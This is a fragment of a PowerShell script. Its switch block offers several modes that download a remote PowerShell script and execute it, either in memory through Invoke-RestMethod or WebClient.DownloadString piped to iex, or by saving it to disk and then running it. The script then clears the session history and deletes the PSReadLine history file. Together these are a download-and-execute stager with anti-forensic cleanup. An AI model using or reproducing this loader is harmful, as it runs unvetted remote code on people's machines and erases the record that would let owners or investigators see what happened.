# --- Main logic --- (existing switch block)
switch ($Mode) {
    'DownloadHtml' {
        if (Test-Path $htmlPath) {
            if (-not $Force) {
                $answer = Read-Host "File $htmlPath already exists. Overwrite? (Y/N)"
                if ($answer -notmatch '^[Yy]') { Write-Info "Aborted: not overwriting."; break }
            } else {
                Remove-Item -LiteralPath $htmlPath -Force -ErrorAction SilentlyContinue
            }
        }
        Download-File -Url $rawHtmlUrl -OutFile $htmlPath -UseRestMethod:$false
        break
    }

    'IrmInvoke' {
        # Fetch with Invoke-RestMethod then iex
        Invoke-RemoteScript-InMemory_Irm -Url $rawPsUrl
        break
    }

    'WebClientInvoke' {
        # Fetch with WebClient.DownloadString then iex
        Invoke-RemoteScript-InMemory_WebClient -Url $rawPsUrl
        break
    }

    'DownloadThenRunPs' {
        Download-Then-Run -Url $rawPsUrl -LocalPath $psPath
        break
    }

    default {
        Write-Err "Unknown mode: $Mode"
    }
}

Write-Info "Done. Mode used: $Mode"

# --- Clear PowerShell session/history ---
try {
    Write-Host "Clearing session history..." -ForegroundColor Cyan
    Clear-History

    $histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $histFile) {
        Remove-Item $histFile -Force
        Write-Host "Deleted PowerShell history file." -ForegroundColor Green
    } else {
        Write-Host "No history file found." -ForegroundColor Yellow
    }
} catch {
    Write-Host "Failed to clear history: $($_.Exception.Message)" -ForegroundColor Red
}
